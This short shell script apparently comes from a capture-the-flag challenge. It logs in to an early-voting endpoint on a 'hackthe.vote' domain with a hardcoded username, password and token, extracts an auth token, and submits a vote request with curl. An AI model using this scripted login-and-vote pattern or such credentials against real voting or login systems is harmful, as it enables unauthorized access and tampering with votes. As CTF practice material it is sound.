#!/bin/sh
authtoken=$(curl -s earlyvoting.hackthe.vote/georgia/login -d username=BrandonJPatterson -d password=loob1Quiep -d token=d4e5f69bacfdf8b6 | jq -r .message)
curl earlyvoting.hackthe.vote/georgia/vote -d vote= -d authtoken=$authtoken
